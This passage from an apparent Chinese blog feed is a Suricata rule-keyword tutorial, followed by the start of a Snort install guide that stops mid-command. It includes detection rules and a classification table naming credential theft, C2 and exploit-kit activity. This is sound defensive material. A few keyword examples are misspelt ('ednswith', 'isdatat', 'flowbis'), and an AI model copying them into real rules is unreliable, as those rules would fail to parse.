title="修饰符关键字"></a>修饰符关键字</h2><p>修饰符关键字有两种修饰符：内容修饰符和粘性缓冲区。</p><h3 id="内容修饰符"><a href="#内容修饰符" class="headerlink" title="内容修饰符"></a><strong>内容修饰符</strong></h3><p>这是老版本的修饰符，放在content字段之后。内容修饰符仅适用于其前面跟的content字段，有局部的概念。</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">alert <span class="hljs-keyword">http</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">any</span> -&gt; <span class="hljs-keyword">any</span> <span class="hljs-keyword">any</span> (content:<span class="hljs-string">&quot;index.php&quot;</span>; http_uri; sid:<span class="hljs-number">1</span>;)</code></pre></div><h3 id="粘性缓冲区"><a href="#粘性缓冲区" class="headerlink" title="粘性缓冲区"></a><strong>粘性缓冲区</strong></h3><p>新版本suricata的修饰符，放在content字段之前，一个规则中可使用多个粘性缓冲区。粘性缓冲区字段之后的所有关键字都适用于该缓冲区，有全局的概念。</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">alert <span class="hljs-keyword">http</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">any</span> -&gt; <span class="hljs-keyword">any</span> <span class="hljs-keyword">any</span> (http_response_line; content:<span class="hljs-string">&quot;403 Forbidden&quot;</span>; sid:<span class="hljs-number">1</span>;)</code></pre></div><p><strong>标准化缓冲区</strong></p><p>将数据包内容进行擦除异常内容，合并数据包等后剩下的数据包内容</p><p>所有 HTTP 关键字（除了类似http_raw_*的缓冲区）、重组流、TLS、SSL、SSH、FTP 和 dcerpc 缓冲区都是标准化缓冲区。</p><h2 id="元数据关键字"><a href="#元数据关键字" class="headerlink" title="元数据关键字"></a>元数据关键字</h2><h3 id="msg-message"><a href="#msg-message" class="headerlink" title="msg (message)"></a><strong>msg (message)</strong></h3><p>功能：描述规则的名称</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">msg:</span><span class="hljs-string">&quot;some description&quot;</span><span class="hljs-comment">;</span></code></pre></div><p>注意： ; \ “ 字符在msg中使用需要进行转义，一般将msg字段中前两个字段大写并写明名称的类别。如msg:”ET TROJAN Likely Bot Nick in IRC (USA +..)”;</p><p>用法示例：</p><div class="code-wrapper"><pre><code class="hljs php">drop tcp <span class="hljs-variable">$HOME_NET</span> any -&gt; <span class="hljs-variable">$EXTERNAL_NET</span> <span class="hljs-title function_ invoke__">any</span> (<span class="hljs-attr">msg</span>:<span class="hljs-string">&quot;ET TROJAN Likely Bot Nick in IRC (USA +..)&quot;</span>; <span class="hljs-attr">flow</span>:established,to_server; <span class="hljs-attr">flowbits</span>:<span class="hljs-keyword">isset</span>,is_proto_irc; <span class="hljs-attr">content</span>:<span class="hljs-string">&quot;NICK &quot;</span>; <span class="hljs-attr">pcre</span>:<span class="hljs-string">&quot;/NICK .*USA.*[0-9]&#123;3,&#125;/i&quot;</span>; <span class="hljs-attr">reference</span>:url,doc.emergingthreats.net/<span class="hljs-number">2008124</span>; <span class="hljs-attr">classtype</span>:trojan-activity; <span class="hljs-attr">sid</span>:<span class="hljs-number">2008124</span>; <span class="hljs-attr">rev</span>:<span class="hljs-number">2</span>;)</code></pre></div><h3 id="sid-signature-ID"><a href="#sid-signature-ID" class="headerlink" title="sid (signature ID)"></a><strong>sid (signature ID)</strong></h3><p>功能：规则的标识符</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">sid</span>:<span class="hljs-number">11111111</span>;</code></pre></div><h3 id="rev-revision"><a href="#rev-revision" class="headerlink" title="rev (revision)"></a><strong>rev (revision)</strong></h3><p>功能：规则的修订版本</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">rev</span>:<span class="hljs-number">123</span>;</code></pre></div><ul><li>一般把rev字段放在sid字段的后面</li></ul><h3 id="gid-group-ID"><a href="#gid-group-ID" class="headerlink" title="gid (group ID)"></a><strong>gid (group ID)</strong></h3><p>功能：类似于sid的另一个id，suricata默认的gid是1，只能在告警日志中查看到gid</p><p>示例：10&#x2F;15&#x2F;09-03:30:10.219671 [<strong>] [1:2008124:2] ET TROJAN Likely Bot Nick in IRC (USA +..) [</strong>] [Classification: A Network Trojan was Detected] [Priority: 3] {TCP} 192.168.1.42:1028 -&gt; 72.184.196.31:6667</p><p>在[1:2008124:2]部分，1是gid，2008124是sid，2是rev</p><h3 id="classtype"><a href="#classtype" class="headerlink" title="classtype"></a><strong>classtype</strong></h3><p>功能：规则分类</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">classtype</span>:&lt;alert-<span class="hljs-keyword">type</span>&gt;;</code></pre></div><p>可以在etc&#x2F;suricata&#x2F;classification.config文件中查看到所有的告警类别，每个classtype都设置了priority字段，拥有优先级。</p><p>注意：一般将classtype放在rev和sid字段之前，其他字段之后</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a><strong>reference</strong></h3><p>功能：编写规则时的参考源</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-keyword">reference</span>:<span class="hljs-keyword">type</span>, xxxxx;</code></pre></div><p>type为etc&#x2F;suricata&#x2F;reference.config文件中的类别</p><p>用法示例：</p><p>reference:cve,CVE-2018-1273;</p><p>reference:url,<a href="http://www.baidu.com/">www.baidu.com</a>;</p><h3 id="priority"><a href="#priority" class="headerlink" title="priority"></a><strong>priority</strong></h3><p>功能：指定规则的优先级。范围是1-255，其中1-4最常用，优先级较高的签名将首先被检查。最高优先级是 1。通常规则中已经通过 classtype 字段设置了优先级。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">priority</span>:[<span class="hljs-number">1</span>-<span class="hljs-number">255</span>];</code></pre></div><h3 id="metadata"><a href="#metadata" class="headerlink" title="metadata"></a><strong>metadata</strong></h3><p>功能：将一些非功能性的信息附加在规则上，如规则的创建时间，规则的编写人。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs vbnet"><span class="hljs-symbol">metadata:</span> <span class="hljs-keyword">key</span> value[, <span class="hljs-keyword">key</span> value, ....];</code></pre></div><p>metadata字段的语法格式自由，但一般采用键值对的方式表示。</p><h3 id="target"><a href="#target" class="headerlink" title="target"></a><strong>target</strong></h3><p>功能：target 关键字允许规则编写者指定警报的哪一侧是攻击的目标。如果指定，警报事件将被增强以包含有关源和目标的信息。</p><div class="code-wrapper"><pre><code class="hljs 1c">target<span class="hljs-punctuation">:</span>[src_ip<span class="hljs-string">|dest_ip]</span></code></pre></div><h2 id="Payload关键字"><a href="#Payload关键字" class="headerlink" title="Payload关键字"></a><strong>Payload关键字</strong></h2><h3 id="content"><a href="#content" class="headerlink" title="content"></a><strong>content</strong></h3><p>功能：匹配字符串。包括可打印字符和非可打印字符。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs ldif"><span class="hljs-attribute">content</span>:&quot;xxxxxx&quot;;<span class="hljs-literal">-</span> 使用感叹号!对匹配项的否定<span class="hljs-literal">-</span> 普通字符可使用字符或十六进制形式表示    &quot;;:|\   5个字符需要使用十六进制形式表示<span class="hljs-literal">-</span> 非打印字符需要使用十六进制形式表示，如字符.的表示形式为|2e|<span class="hljs-literal">-</span> 区分大小写</code></pre></div><p><strong>使用示例</strong></p><div class="code-wrapper"><pre><code class="hljs css">匹配shiro字符<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;shiro&quot;</span>;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;sh|69||72||6f|&quot;</span>;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;|73 68 69 72 6f|&quot;</span>;</code></pre></div><h3 id="nocase"><a href="#nocase" class="headerlink" title="nocase"></a><strong>nocase</strong></h3><p>功能：是content字段的修饰符，不区分匹配字符大小写。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxx&quot;</span>; nocase;</code></pre></div><h3 id="depth"><a href="#depth" class="headerlink" title="depth"></a><strong>depth</strong></h3><p>功能：depth是content字段的修饰符。在数据包或流开头的第一个字符向后N个字符内检查content字段内容。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; depth:N;</code></pre></div><p>用法示例：</p><div class="code-wrapper"><pre><code class="hljs css">在数据包或流最开始匹配字符<span class="hljs-number">123456789</span><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;456&quot;</span>; depth:<span class="hljs-number">3</span>;匹配不上<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;123&quot;</span>; depth:<span class="hljs-number">3</span>;可以匹配</code></pre></div><h3 id="startswith"><a href="#startswith" class="headerlink" title="startswith"></a><strong>startswith</strong></h3><p>功能：是content字段的修饰符，类似于depth</p><p>语法：content:”xxx”; startswith;</p><p>注意：startswith不能在同一个模式内和depth, offset, within , distance混用</p><p>用法示例：</p><p>content:”GET|20|”; startswith;</p><p>等价于</p><p>content:”GET|20|”; depth:4; offset:0;</p><h3 id="endswith"><a href="#endswith" class="headerlink" title="endswith"></a><strong>endswith</strong></h3><p>功能：是content字段的修饰符，类似于isdataat:!1,relative;</p><p>语法：content:”xxx”; ednswith;</p><p>注意：endswith不能在同一个模式内和offset, within , distance混用</p><p>用法示例：</p><p>content:”.php”; endswith;</p><p>等价于</p><p>content:”.php”; isdatat:!1,relative;</p><h3 id="offset"><a href="#offset" class="headerlink" title="offset"></a><strong>offset</strong></h3><p>功能：content字段的修饰符。从数据包或流第一个字符开始向后偏移N个字符进行content条件匹配。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; <span class="hljs-attribute">offset</span>:N;</code></pre></div><p>offset可以和depth混合使用</p><p>用法示例：</p><div class="code-wrapper"><pre><code class="hljs css">payload:<span class="hljs-number">123456789</span>content:<span class="hljs-string">&quot;123&quot;</span>; <span class="hljs-attribute">offset</span>:<span class="hljs-number">3</span>;不能匹配<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;456&quot;</span>; <span class="hljs-attribute">offset</span>:<span class="hljs-number">3</span>;可以匹配</code></pre></div><h3 id="distance"><a href="#distance" class="headerlink" title="distance"></a><strong>distance</strong></h3><p>功能：distance是content字段的一个相对修饰符。在多个content字段中，后面的content字段相对于前面的content字段N个字符距离进行匹配。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; distance:N;- N可以为负数</code></pre></div><p>用法示例：</p><p>字符串123456789</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;123&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;789&quot;</span>; distance:<span class="hljs-number">3</span>;可以匹配上<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;123&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;789&quot;</span>; distance:<span class="hljs-number">4</span>;匹配不上</code></pre></div><h3 id="within"><a href="#within" class="headerlink" title="within"></a><strong>within</strong></h3><p>功能：content字段的修饰符。在多个content字段中，在前面的content字段之后的N个字符内进行匹配后面的content字段。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; within:N;- 可以和distance混用</code></pre></div><p>用法示例：</p><p>payload:123456789</p><p>content:”123”; content:”456”; within:3; 可以匹配上</p><p>content:”123”; content:”789”; within:3; 匹配不上</p><h3 id="isdataat"><a href="#isdataat" class="headerlink" title="isdataat"></a><strong>isdataat</strong></h3><p>功能：判断指定位置是否为数据。</p><p>语法：</p><p>isdataat:N; 判断从从数据包或流第一个字符向后N个字符的位置是否为数据。</p><p>isdataat:N,relative;判断从最后一个匹配的content向后N个字符处是否为数据。</p><p>注意：使用isdataat可以在前面加!</p><p>用法示例：</p><p>payload:123456789(\n)</p><p>isdataat:10; 不会告警</p><p>content:”123”; isdataat:2, relative; 产生告警</p><h3 id="bsize"><a href="#bsize" class="headerlink" title="bsize"></a><strong>bsize</strong></h3><p>功能：匹配缓冲区(http_*，http.*，dns.<em>，tcp.</em>)的长度。</p><p>语法：</p><p>content:”xxxx”; http_cookie; bsize:N;</p><p>content:”xxxx”; http_cookie; bsize:&gt;N;</p><p>content:”xxxx”; http_cookie; bsize:M&lt;&gt;N;</p><p>用法示例：</p><p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;64.0.3282.186 Safari&#x2F;537.36</p><p>http.user_agent; bsize:&gt;110;可以匹配</p><p>http.user_agent; bsize:&gt;120;匹配不上</p><h3 id="dsize"><a href="#dsize" class="headerlink" title="dsize"></a><strong>dsize</strong></h3><p>功能：判断数据包的长度。这在检测缓冲区溢出时可能很方便</p><p>语法：dsize:<number>;</p><p>dsize:N;</p><p>dsize:&gt;N;</p><p>dsize:M&lt;&gt;N;</p><p>用法示例：</p><p>假如一个请求数据包有744个字符。</p><p>dsize:744;可以匹配</p><p>dsize:&lt;745; 可以匹配</p><p>dsize:743&lt;&gt;745;可以匹配</p><p>dsize:&gt;745;匹配不上</p><h3 id="byte-test"><a href="#byte-test" class="headerlink" title="byte_test"></a><strong>byte_test</strong></h3><h3 id="byte-jump"><a href="#byte-jump" class="headerlink" title="byte_jump"></a><strong>byte_jump</strong></h3><h3 id="byte-extract"><a href="#byte-extract" class="headerlink" title="byte_extract"></a><strong>byte_extract</strong></h3><h3 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a><strong>rpc</strong></h3><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a><strong>replace</strong></h3><h3 id="pcre"><a href="#pcre" class="headerlink" title="pcre"></a><strong>pcre</strong></h3><p>功能：</p><p>兼容perl的正则表达式</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">pcre:</span><span class="hljs-string">&quot;/&lt;regex&gt;/options&quot;</span><span class="hljs-comment">;</span></code></pre></div><p>注意：pcre 的复杂性带来了高昂的代价：它对性能有负面影响。因此，为了减轻 Suricata 经常检查 pcre 的负担，pcre 主要与”内容”结合使用。在这种情况下，内容必须首先匹配，然后才会检查 pcre。</p><p><strong>关于URL解码</strong></p><p><strong>content的http_uri\http_raw_uri都支持对URL进行解码</strong></p><p><strong>pcre的http_uri\http_raw_uri都支持对URL进行解码</strong></p><p><strong>pcre的HTTP-request-body不支持对请求体进行URL解码</strong></p><p><strong>perl兼容的修饰符</strong></p><table><thead><tr><th>修饰符</th><th align="center">功能</th></tr></thead><tbody><tr><td>i</td><td align="center">不区分大小写</td></tr><tr><td>s</td><td align="center">匹配换行符</td></tr><tr><td>m</td><td align="center">可以将一行（有效负载）计为两行</td></tr><tr><td>A</td><td align="center">模式必须在缓冲区的开头匹配</td></tr><tr><td>E</td><td align="center">忽略缓冲区&#x2F;有效负载末尾的换行符</td></tr><tr><td>G</td><td align="center">反转贪心</td></tr><tr><td>R</td><td align="center">相对于最后一个模式匹配的匹配。类似于distance:0;</td></tr><tr><td>U</td><td align="center">在content的http_uri上匹配</td></tr><tr><td>I</td><td align="center">在HTTP-raw-uri 上进行pcre匹配</td></tr><tr><td>P</td><td align="center">在 HTTP-request-body 上进行pcre匹配</td></tr><tr><td>Q</td><td align="center">在 HTTP-response-body 上进行pcre匹配</td></tr><tr><td>H</td><td align="center">在 HTTP-header 上进行pcre匹配</td></tr><tr><td>D</td><td align="center">在 http_raw_header 上进行pcre匹配</td></tr><tr><td>M</td><td align="center">在 request-method 上进行pcre匹配</td></tr><tr><td>C</td><td align="center">在 HTTP-cookie 上进行pcre匹配</td></tr><tr><td>S</td><td align="center">在 HTTP-stat-code 上进行pcre匹配</td></tr><tr><td>Y</td><td align="center">在 HTTP-stat-msg 上进行pcre匹配</td></tr><tr><td>B</td><td align="center"></td></tr><tr><td>O</td><td align="center">覆盖配置的 pcre 匹配限制</td></tr><tr><td>V</td><td align="center">在 HTTP-User-Agent 上进行pcre匹配</td></tr><tr><td>W</td><td align="center">在 HTTP-Host 上进行pcre匹配</td></tr></tbody></table><h2 id="预过滤关键字"><a href="#预过滤关键字" class="headerlink" title="预过滤关键字"></a>预过滤关键字</h2><h3 id="fast-pattern"><a href="#fast-pattern" class="headerlink" title="fast_pattern"></a><strong>fast_pattern</strong></h3><p>理解fast_pattern的功能需要了解一下suricata的匹配原理</p><p><strong>匹配原理：</strong></p><p><strong>content:”xxxx”; content:”xxxx”;</strong></p><p>在存在多个content字段的规则中，如果content后面没有显示地设置fast_pattern关键字，则suricata会根据内部机制自动选择一个content作为快速模式匹配。</p><ol><li><p>首先判断content字段或content字段的缓冲区修饰符的优先级，优先级高的作为快速模式匹配。</p></li><li><p>如果所有content字段的修饰符的优先级相同，则选择content字段内容的字符长度最长的作为快速模式匹配。</p></li><li><p>如果缓冲区修饰符的优先级和content字段内容长度相同，则使用具有最高字符&#x2F;字节多样性分数（”模式强度”）的内容匹配作为快速模式匹配。</p></li><li><p>如果多个内容匹配具有相同的最高优先级、最长的长度和相同的最高模式强度，则最后注册的缓冲区（”list_id”）用作快速模式匹配。</p></li><li><p>如果多个内容匹配具有相同的最高优先级，符合最长的长度，相同的最高模式强度，并且具有相同的list_id（即在同一个缓冲区中查找），那么首先出现的那个（从左到右) 在规则中用作快速模式匹配。</p></li></ol><p><strong>content:”xxxx”; content:”xxxx”; fast_pattern;</strong></p><p>在存在多个content字段的规则中，如果content字段后面显示地设置了fast_pattern修饰符，则使用这个content字段作为快速模式匹配。</p><p><strong>语法：</strong></p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; fast_pattern;<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;xxxx&quot;</span>; fast_pattern:only;</code></pre></div><p>常用在规则中只有一个content字段，可写可不写。</p><p>content:”xxxx”; fast_pattern:<offset>, <length>;</p><h3 id="prefilter"><a href="#prefilter" class="headerlink" title="prefilter"></a><strong>prefilter</strong></h3><h2 id="流关键字"><a href="#流关键字" class="headerlink" title="流关键字"></a>流关键字</h2><h3 id="flowbits"><a href="#flowbits" class="headerlink" title="flowbits"></a><strong>flowbits</strong></h3><p>功能：用于在多个TCP流中匹配规则，当满足指定的条件时标记流。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs sqf">flowbis:&lt;<span class="hljs-built_in">action</span>&gt;,&lt;<span class="hljs-built_in">name</span>&gt;;&lt;<span class="hljs-built_in">action</span>&gt;是flowbits要执行的动作，&lt;<span class="hljs-built_in">name</span>&gt;是flowbits的名称，一组规则中的<span class="hljs-built_in">name</span>需要一致动作:<span class="hljs-built_in">set</span>：当满足匹配条件时，设置一个流标记isset：用于判断指定的流是否被设置，若为真则产生告警unset：当满足匹配条件时，取消设置一个流标记noalert：不产生告警。一般和<span class="hljs-built_in">set</span>动作一起使用toggle：isnotset：</code></pre></div><p>使用示例：</p><p>某个漏洞需要编写多个规则来监测。其中第一条规则匹配到指定关键字后将这个流标记，不产生告警。第二条规则判断指定的流标记是否存在，若存在且匹配到关键字产生告警</p><div class="code-wrapper"><pre><code class="hljs css">alert tcp any any -&gt; any any (msg:<span class="hljs-string">&quot;first rule&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;condition1&quot;</span>; flowbits:set,detect_rce; sid:<span class="hljs-number">11111111</span>;)alert tcp any any -&gt; any any (msg:<span class="hljs-string">&quot;second rule&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;condition2&quot;</span>; flowbits<span class="hljs-selector-pseudo">:is</span>set,detect_rce; sid:<span class="hljs-number">22222222</span>;)</code></pre></div><h3 id="flow"><a href="#flow" class="headerlink" title="flow"></a><strong>flow</strong></h3><p>功能：用于匹配流的方向、匹配是否建立了流、仅匹配流或者仅匹配数据包（没有建立完整会话）。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">flow</span>:action1[,action2,...];</code></pre></div><table><thead><tr><th>动作</th><th>说明</th></tr></thead><tbody><tr><td>to_client</td><td></td></tr><tr><td>to_server</td><td></td></tr><tr><td>from_client</td><td></td></tr><tr><td>from_server</td><td></td></tr><tr><td>established</td><td>匹配已建立的连接</td></tr><tr><td>not_established</td><td>匹配未建立的连接</td></tr><tr><td>stateless</td><td>匹配无状态的连接</td></tr><tr><td>only_stream</td><td>匹配流引擎重新组装的数据包</td></tr><tr><td>no_stream</td><td>匹配流引擎尚未重组的数据包。不会匹配已重新组装的数据包</td></tr><tr><td>only_frag</td><td>匹配已从片段重组的数据包</td></tr><tr><td>no_frag</td><td>匹配尚未从分片重组的数据包</td></tr></tbody></table><h3 id="flowint"><a href="#flowint" class="headerlink" title="flowint"></a><strong>flowint</strong></h3><h3 id="stream-size"><a href="#stream-size" class="headerlink" title="stream_size"></a><strong>stream_size</strong></h3><h2 id="Base64关键字"><a href="#Base64关键字" class="headerlink" title="Base64关键字"></a><strong>Base64关键字</strong></h2><p>Suricata 支持从缓冲区解码 base64 编码数据并匹配解码数据。需同时在规则中使用下面两个关键字才能生效。</p><h3 id="base64-decode"><a href="#base64-decode" class="headerlink" title="base64_decode"></a><strong>base64_decode</strong></h3><p>功能：从缓冲区解码 base64 数据并使其可用于 base64_data 关键字。</p><p>语法：</p><div class="code-wrapper"><pre><code class="hljs xml">base64_decode:bytes <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>, offset <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>, relative;</code></pre></div><p>bytes选项指定 Suricata 应解码并为 base64_data 提供多少字节。解码将在缓冲区结束时停止。</p><p>offset选项指定 Suricata 在解码之前应该跳过多少字节。relative如果未设置，则相对于有效负载缓冲区的开始跳过字节。</p><p>relative选项使解码相对于先前的内容匹配开始。默认行为是从缓冲区的开头开始。此选项使offset跳过相对于前一个匹配的字节。</p><h3 id="base64-data"><a href="#base64-data" class="headerlink" title="base64_data"></a><strong>base64_data</strong></h3><p>功能：base64_data 是一个粘性缓冲区，对先前由 base64_decode 解码的数据启用内容匹配。</p><p>用法示例：</p><p>这是在 http_uri 缓冲区中找到的 base64 编码字符串”test”的规则匹配示例。</p><p>它开始相对于已知偏移量为 1 的已知字符串”somestring”进行解码。这必须是缓冲区中”somestring”的第一次出现。</p><h1 id="规则分类"><a href="#规则分类" class="headerlink" title="规则分类"></a>规则分类</h1><table><thead><tr><th>类别</th><th>描述</th><th>描述</th></tr></thead><tbody><tr><td>not-suspicious</td><td>Not Suspicious Traffic</td><td>非可疑流量</td></tr><tr><td>unknown</td><td>Unknown Traffic</td><td>未知流量</td></tr><tr><td>bad-unknown</td><td>Potentially Bad Traffic</td><td>潜在的坏流量</td></tr><tr><td>attempted-recon</td><td>Attempted Information Leak</td><td>试图泄露信息</td></tr><tr><td>successful-recon-limited</td><td>Information Leak</td><td>小范围的信息泄露</td></tr><tr><td>successful-recon-largescale</td><td>Large Scale Information Leak</td><td>大范围的信息泄露</td></tr><tr><td>attempted-dos</td><td>Attempted Denial of Service</td><td>尝试拒绝服务</td></tr><tr><td>successful-dos</td><td>Denial of Service</td><td>成功拒绝服务</td></tr><tr><td>attempted-user</td><td>Attempted User Privilege Gain</td><td>尝试获得用户权限</td></tr><tr><td>unsuccessful-user</td><td>Unsuccessful User Privilege Gain</td><td>获取用户权限失败</td></tr><tr><td>successful-user</td><td>Successful User Privilege Gain</td><td>获取用户权限成功</td></tr><tr><td>attempted-admin</td><td>Attempted Administrator Privilege Gain</td><td>尝试获取管理员权限</td></tr><tr><td>successful-admin</td><td>Successful Administrator Privilege Gain</td><td>成功获取管理员权限</td></tr><tr><td>rpc-portmap-decode</td><td>Decode of an RPC Query</td><td>RPC查询解码</td></tr><tr><td>shellcode-detect</td><td>Executable code was detected</td><td>shellcode检测</td></tr><tr><td>string-detect</td><td>A suspicious string was detected</td><td>可疑字符串检测</td></tr><tr><td>suspicious-filename-detect</td><td>A suspicious filename was detected</td><td>可疑文件名检测</td></tr><tr><td>suspicious-login</td><td>An attempted login using a suspicious username was detected</td><td>可疑登陆</td></tr><tr><td>system-call-detect</td><td>A system call was detected</td><td>系统调用检测</td></tr><tr><td>tcp-connection</td><td>A TCP connection was detected</td><td>TCP连接检测</td></tr><tr><td>trojan-activity</td><td>A Network Trojan was detected</td><td>木马检测</td></tr><tr><td>unusual-client-port-connection</td><td>A client was using an unusual port</td><td>不寻常端口连接</td></tr><tr><td>network-scan</td><td>Detection of a Network Scan</td><td>网络扫描检测</td></tr><tr><td>denial-of-service</td><td>Detection of a Denial of Service Attack</td><td>拒绝服务</td></tr><tr><td>non-standard-protocol</td><td>Detection of a non-standard protocol or event</td><td>非标准协议检测</td></tr><tr><td>protocol-command-decode</td><td>Generic Protocol Command Decode</td><td></td></tr><tr><td>web-application-activity</td><td>access to a potentially vulnerable web application</td><td>Web应用漏洞</td></tr><tr><td>web-application-attack</td><td>Web Application Attack</td><td>Web应用攻击</td></tr><tr><td>misc-activity</td><td>Misc activity</td><td></td></tr><tr><td>misc-attack</td><td>Misc Attack</td><td></td></tr><tr><td>icmp-event</td><td>Generic ICMP event</td><td></td></tr><tr><td>inappropriate-content</td><td>Inappropriate Content was Detected</td><td></td></tr><tr><td>policy-violation</td><td>Potential Corporate Privacy Violation</td><td></td></tr><tr><td>default-login-attempt</td><td>Attempt to login by a default username and password</td><td></td></tr><tr><td>targeted-activity</td><td>Targeted Malicious Activity was Detected</td><td></td></tr><tr><td>exploit-kit</td><td>Exploit Kit Activity Detected</td><td></td></tr><tr><td>external-ip-check</td><td>Device Retrieving External IP Address Detected</td><td></td></tr><tr><td>domain-c2</td><td>Domain Observed Used for C2 Detected</td><td></td></tr><tr><td>pup-activity</td><td>Possibly Unwanted Program Detected</td><td></td></tr><tr><td>credential-theft</td><td>Successful Credential Theft Detected</td><td></td></tr><tr><td>social-engineering</td><td>Possible Social Engineering Attempted</td><td></td></tr><tr><td>coin-mining</td><td>Crypto Currency Mining Activity Detected</td><td></td></tr><tr><td>command-and-control</td><td>Malware Command and Control Activity Detected</td><td></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Suricata</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Suricata</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Snort安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Snort/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Snort/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>ubuntu 22.04</p><p>snort-2.9.20</p><div class="code-wrapper"><pre><code class="hljs bash">apt updateapt install vim wget iproute2 build-essential libpcap-dev libpcre3-dev libnet1-dev zlib1g-dev luajit hwloc libdnet-dev libdumbnet-dev bison flex liblzma-dev openssl libssl-dev pkg-config libhwloc-dev cmake cpputest libsqlite3-dev uuid-dev libcmocka-dev libnetfilter-queue-dev libmnl-dev autotools-dev libluajit-5.1-dev libunwind-dev libtirpc-devwget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gztar -xf daq-2.0.7.tar.gz<span class="hljs-built_in">cd</span> daq-2.0.7./configuremake -j 4make install<span class="hljs-built_in">cd</span> /opt/wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gztar -xf snort-2.9.20.tar.gz<span class="hljs-built_in">cd</span> snort-2.9.20<span class="hljs-built_in">cp</span> -r  /usr/include/tirpc/rpc/  /usr/include/<span class="hljs-built_in">cp</span> -r /usr/include/tirpc/netconfig.h  /usr/include/./configure --prefix=/opt/snort2_9 --enable-sourcefire    <span class="hljs-comment">#安装在/opt/snort2_9</span>make -j 4make installldconfig</code></pre></div><p>创建配置目录及文件</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /opt/snort2_9/etc<span class="hljs-built_in">mkdir</span> /opt/snort2_9/rules<span class="hljs-built_in">mkdir</span> /opt/snort2_9/preproc_rules<span class="hljs-built_in">mkdir</span> /opt/snort2_9/lib/snort_dynamicrules<span class="hljs-built_in">mkdir</span> /opt/snort2_9/so_rules<span class="hljs-built_in">mkdir</span> /opt/snort2_9/log<span class="hljs-built_in">mkdir</span> /opt/snort2_9/log/archived_logs<span class="hljs-built_in">touch</span> /opt/snort2_9/rules/black_list.rules<span class="hljs-built_in">touch</span> /opt/snort2_9/rules/white_list.rules<span class="hljs-built_in">touch</span> /opt/snort2_9/rules/local.rules<span class="hljs-built_in">touch</span> /opt/snort2_9/sid-msg.map<span class="hljs-built_in">cp</span> /opt/snort-2.9.20/etc/*.conf* /opt/snort2_9/etc/<span class="hljs-built_in">cp</span> /opt/snort-2.9.20/etc/*.map /opt/snort2_9/etc/<span class="hljs-built_in">cp</span> /opt/snort-2.9.20/etc/*.dtd /opt/snort2_9/etc/<span class="hljs-built_in">cp</span> /opt/snort-2.9.20/src/dynamic-preprocessors/build/opt/snort2_9/lib/snort_dynamicpreprocessor/* /opt/snort2_9/lib/snort_dynamicpreprocessor/</code></pre></div><p>修改配置文件</p><div class="code-wrapper"><pre><code class="hljs swift">#修改库文件路径sed <span class="hljs-operator">-</span>i &#x27;s<span class="hljs-regexp">/\.\./</span>\<span 